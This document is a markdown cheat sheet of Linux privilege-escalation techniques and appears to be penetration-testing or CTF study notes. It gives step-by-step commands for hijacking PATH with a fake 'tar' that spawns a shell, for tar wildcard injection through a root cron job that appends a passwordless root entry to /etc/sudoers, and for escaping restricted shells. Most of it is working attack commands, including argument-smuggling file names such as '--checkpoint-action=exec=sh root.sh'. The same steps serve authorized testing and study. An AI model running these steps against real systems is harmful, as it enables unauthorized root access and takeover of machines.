# Path Abuse
When a script does not specify the full path in a command and there is direct control over the PATH variable. This replaces a common binary with a malicious script. 
* SUID binaries that call a command/utility without a full path
* Script/cron job that call a command without a full path
* Writable directories in PATH
* Search order priority goes from left to right

**1. Inspect Script Command(s)**

**2. Check PATH Content**
```
env | grep PATH
echo $PATH
```
**3. Check for Writable Directory in PATH:** If none are writable, but PATH can be modified, add a path in /tmp
```
echo $PATH | tr ':' '\n' | xargs -I{} ls -ld {}
```
**4. Add Directory to PATH**
```
PATH=.:${PATH}       #adds current directory to the path
export PATH          #confirms the current directory to the path
echo $PATH           #display path to double check
```
**5. Replace Binary:** Change the binary (tar) with the one used in the command; change the content if necessary.
```
echo -e '#!/bin/bash\n/bin/bash' > tar
chmod +x tar
```
**6. Escalate Privileges:** If the binary can be executed as sudo, run it with sudo. If it is a cron job, wait for it to be executed. 

<br>

# Wildcard Abuse
Check cron jobs (running as a high-privilged user) for a tar command that uses the wildcard \*. The user has to have w access to the directory that the cronjob is accessing (archiving in this case)

**1. Check Cron Job**
```
ls -lah /etc/cron*
crontab -l           #unprivileged attempt
sudo crontab -l      #if privileges allow it
grep "CRON" /var/log/syslog
```
**2. Leverage Cron Job:** Write the following in the same directory as the cron job
```
echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```
**3. Check Sudo Privileges**
```
sudo -l
sudo -i
```

<br>

# Escaping Restricted Shells

**1. Command Injection**
```
ls -l `pwd`
```
**2. Command Chaining**
```
pwd; ls /
```
**3. Environment Variables**
```
echo "$(<file.ext )"
```
